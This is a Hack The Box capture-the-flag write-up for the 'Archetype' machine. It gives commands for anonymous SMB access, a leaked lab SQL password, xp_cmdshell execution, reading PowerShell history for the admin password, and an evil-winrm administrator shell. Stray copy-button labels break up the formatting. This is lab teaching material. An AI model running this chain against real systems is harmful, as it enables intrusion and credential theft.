# HTB Archetype – Write-up

## Machine Information
- **Name:** Archetype
- **Difficulty:** Very Easy
- **Operating System:** Windows Server
- **Platform:** Hack The Box

---

## 1. Reconnaissance

An initial Nmap scan was performed to identify open ports and running services.

```bash
nmap -sC -sV -oN nmap.txt TARGET_IP
Open Ports
135/tcp – MS RPC

139/tcp – NetBIOS

445/tcp – SMB

1433/tcp – Microsoft SQL Server

5985/tcp – WinRM

2. SMB Enumeration
Anonymous SMB access was tested and available shares were enumerated.

bash
Копировать код
smbclient -L TARGET_IP -N
An accessible share was found:

backups

3. Accessing the Backups Share
The backups share was accessed anonymously.

bash
Копировать код
smbclient //TARGET_IP/backups -N
Inside the share, a configuration file was discovered:

prod.dtsConfig

This file was downloaded for further analysis.

4. Credential Disclosure
The prod.dtsConfig file contained a database connection string with plaintext credentials:

pgsql
Копировать код
User ID=ARCHETYPE\sql_svc
Password=M3g4c0rp123
This represents a sensitive information disclosure due to improper backup storage.

5. MSSQL Access
Using the disclosed credentials, an authenticated connection to Microsoft SQL Server was established using Impacket.

bash
Копировать код
impacket-mssqlclient ARCHETYPE/sql_svc@TARGET_IP -windows-auth
Successful authentication granted access to the MSSQL prompt.

6. Command Execution via xp_cmdshell
The extended stored procedure xp_cmdshell was enabled and used to execute system commands.

sql
Копировать код
xp_cmdshell "whoami"
Output confirmed command execution as:

Копировать код
archetype\sql_svc
7. Privilege Escalation
PowerShell command history for the sql_svc user was reviewed.

sql
Копировать код
xp_cmdshell "type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
The history revealed the Administrator password.

8. Administrator Access
Using the recovered credentials, a WinRM session was established.

bash
Копировать код
evil-winrm -i TARGET_IP -u Administrator -p 'PASSWORD'
This provided a full Administrator shell.

9. Flags
User Flag
makefile
Копировать код
C:\Users\sql_svc\Desktop\user.txt
Root Flag
makefile
Копировать код
C:\Users\Administrator\Desktop\root.txt
10. Conclusion
Vulnerabilities Identified
Anonymous SMB access

Sensitive information stored in backup files

Plaintext credential disclosure

Insecure credential reuse

Key Takeaways
Backup files often contain sensitive information

SMB misconfigurations can lead to full system compromise

MSSQL xp_cmdshell can result in remote command execution

Tools Used
Nmap

smbclient

Impacket (mssqlclient.py)

Evil-WinRM
